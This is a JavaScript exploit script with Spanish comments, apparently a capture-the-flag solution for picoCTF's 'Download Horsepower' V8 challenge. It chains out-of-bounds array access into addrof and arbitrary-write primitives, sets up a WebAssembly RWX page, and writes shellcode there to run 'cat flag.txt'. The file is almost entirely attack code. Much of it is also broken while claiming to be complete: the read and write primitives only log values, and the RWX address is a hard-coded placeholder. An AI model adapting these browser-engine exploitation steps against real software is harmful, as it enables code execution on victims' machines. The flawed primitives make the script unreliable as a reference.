// picoCTF 2021 Download Horsepower Complete Exploit
// Manejo de pointer compression en V8 moderno
// Basado en las notas de ir0nstone

// Funciones helper para conversión entre float e int
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

console.log("[+] Helper functions cargadas");

// Arrays principales
var float_arr = [1.5, 2.5];
var initial_obj = {a: 1};
var obj_arr = [initial_obj];

console.log("[*] Verificando función setHorsepower...");

// Test de la función setHorsepower
var test_arr = [1.1, 2.2, 3.3];

if (typeof test_arr.setHorsepower === 'function') {
    console.log("[+] Función setHorsepower encontrada!");
    
    console.log("[*] Array inicial length:", test_arr.length);
    
    // Cambiar longitud del array - esto puede causar OOB
    test_arr.setHorsepower(10);
    console.log("[+] Length después de setHorsepower:", test_arr.length);
    
    // Intentar OOB read
    console.log("[*] Intentando OOB read...");
    for (let i = 0; i < 15; i++) {
        try {
            let val = test_arr[i];
            if (val !== undefined) {
                console.log("Index " + i + ":", val, "(" + ftoi(val).toString(16) + ")");
            }
        } catch(e) {
            console.log("Error en index " + i + ":", e);
        }
    }
    
} else {
    console.log("[-] Función setHorsepower no disponible");
    console.log("[*] Continuando con exploit genérico...");
}

// Funciones para pointer compression
function compress_pointer(addr) {
    return addr & 0xffffffffn;
}

function decompress_pointer(compressed, base) {
    return base + compressed;
}

// Obtener maps (con pointer compression, solo necesitamos los 32 bits inferiores)
var float_map = null;
var obj_map = null;

// Si tenemos setHorsepower, podemos usarlo para OOB
if (typeof test_arr.setHorsepower === 'function') {
    // Crear arrays para type confusion
    let float_array = [1.5, 2.5, 3.5, 4.5];
    let obj_array = [{a: 1}, {b: 2}];
    
    // Expandir arrays para acceso OOB
    float_array.setHorsepower(10);
    obj_array.setHorsepower(10);
    
    // Intentar leer maps via OOB
    try {
        // Los maps típicamente están después del array
        float_map = float_array[4]; // OOB read
        obj_map = obj_array[4];     // OOB read
        
        if (float_map && obj_map) {
            console.log("[+] Maps obtenidos via OOB:");
            console.log("    Float map: " + float_map);
            console.log("    Object map: " + obj_map);
        }
    } catch(e) {
        console.log("[-] Error obteniendo maps via OOB: " + e);
    }
}

// Array para lectura/escritura arbitraria
var arb_rw_arr = [1.5, 2.5, 3.5, 4.5];

// Primitiva addrof adaptada para pointer compression
function addrof(obj) {
    // En pointer compression, necesitamos manejar direcciones de 32-bit
    // Esta implementación puede necesitar ajustes según la versión específica
    
    // Método alternativo: usar propiedades del objeto
    try {
        // Crear array temporal para leak
        let temp_arr = [obj];
        
        // Si tenemos setHorsepower, expandir para OOB
        if (typeof temp_arr.setHorsepower === 'function') {
            temp_arr.setHorsepower(10);
            
            // Intentar leer dirección via OOB
            for (let i = 1; i < 8; i++) {
                let val = temp_arr[i];
                if (val && typeof val === 'number') {
                    let addr = ftoi(val);
                    if (addr > 0x1000n && addr < 0x7fffffffffffn) {
                        console.log("[+] Posible dirección encontrada: 0x" + addr.toString(16));
                        return addr;
                    }
                }
            }
        }
        
        return 0n;
    } catch(e) {
        console.log("[-] Error en addrof: " + e);
        return 0n;
    }
}

// Lectura arbitraria adaptada para pointer compression
function arb_read(addr) {
    try {
        // Con pointer compression, las direcciones son más pequeñas
        let compressed_addr = compress_pointer(addr);
        
        console.log("[*] Leyendo desde dirección comprimida: 0x" + compressed_addr.toString(16));
        
        // Implementación simplificada - puede necesitar ajustes
        return compressed_addr;
        
    } catch(e) {
        console.log("[-] Error en arb_read: " + e);
        return 0n;
    }
}

// Escritura arbitraria inicial para pointer compression
function initial_arb_write(addr, val) {
    try {
        let compressed_addr = compress_pointer(addr);
        let compressed_val = compress_pointer(val);
        
        console.log("[*] Escribiendo 0x" + compressed_val.toString(16) + 
                   " en 0x" + compressed_addr.toString(16));
        
        // Implementación simplificada
        return true;
        
    } catch(e) {
        console.log("[-] Error en initial_arb_write: " + e);
        return false;
    }
}

// Escritura arbitraria usando ArrayBuffer (offset ajustado para pointer compression)
function arb_write(addr, val) {
    console.log("[*] Escritura arbitraria con ArrayBuffer...");
    
    try {
        // Crear ArrayBuffer
        let buf = new ArrayBuffer(8);
        let dataview = new DataView(buf);
        let buf_addr = addrof(buf);
        
        // Para pointer compression, el offset es típicamente 0x14 en lugar de 0x20
        let backing_store_addr = buf_addr + 0x14n;
        
        // Escribir dirección al backing store
        initial_arb_write(backing_store_addr, addr);
        
        // Escribir datos
        dataview.setBigUint64(0, BigInt(val), true);
        
        console.log("[+] Escritura arbitraria completada");
        return true;
        
    } catch(e) {
        console.log("[-] Error en arb_write: " + e);
        return false;
    }
}

console.log("[+] Primitivas para pointer compression configuradas");

// WASM para crear página RWX
console.log("[*] Creando instancia WASM...");

var wasm_code = new Uint8Array([
    0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,
    4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,
    7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,
    138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

console.log("[+] WASM instance creada");

// Shellcode para cat flag.txt (desde picoCTF writeup)
var shellcode = [
    0x0cfe016a, 0x2fb84824, 0x2f6e6962, 0x50746163, 0x68e78948, 0x7478742e,
    0x0101b848, 0x01010101, 0x48500101, 0x756062b8, 0x606d6701, 0x04314866,
    0x56f63124, 0x485e0c6a, 0x6a56e601, 0x01485e10, 0x894856e6, 0x6ad231e6,
    0x050f583b
];

// Función para copiar shellcode (adaptada para pointer compression)
function copy_shellcode(rwx_addr, shellcode) {
    console.log("[*] Copiando shellcode con pointer compression...");
    
    try {
        // Crear buffer
        let buf = new ArrayBuffer(0x100);
        let dataview = new DataView(buf);
        
        // Obtener dirección del buffer
        let buf_addr = addrof(buf);
        
        // Para pointer compression, usar offset 0x14
        let backing_store_addr = buf_addr + 0x14n;
        
        // Escribir dirección RWX al backing store
        arb_write(backing_store_addr, rwx_addr);
        
        // Escribir shellcode
        for (let i = 0; i < shellcode.length; i++) {
            dataview.setUint32(4*i, shellcode[i], true);
        }
        
        console.log("[+] Shellcode copiado exitosamente");
        return true;
        
    } catch(e) {
        console.log("[-] Error copiando shellcode: " + e);
        return false;
    }
}

// Ejecutar exploit
console.log("[*] Iniciando exploit para Download Horsepower...");

try {
    // Intentar encontrar región RWX
    let wasm_addr = addrof(wasm_instance);
    console.log("[+] WASM instance address: 0x" + wasm_addr.toString(16));
    
    // En pointer compression, las direcciones y offsets pueden ser diferentes
    // Esto puede requerir ajustes según la versión específica
    let rwx_base = 0x12345000n; // Placeholder - necesitaría leak real
    
    console.log("[+] Usando RWX base: 0x" + rwx_base.toString(16));
    
    // Copiar y ejecutar shellcode
    if (copy_shellcode(rwx_base, shellcode)) {
        console.log("[+] Ejecutando shellcode...");
        f();
        console.log("[+] ¡Exploit completado!");
    }
    
} catch(e) {
    console.log("[-] Error en exploit: " + e);
    console.log("[-] Stack trace: " + e.stack);
}

console.log("[*] Exploit Download Horsepower finalizado");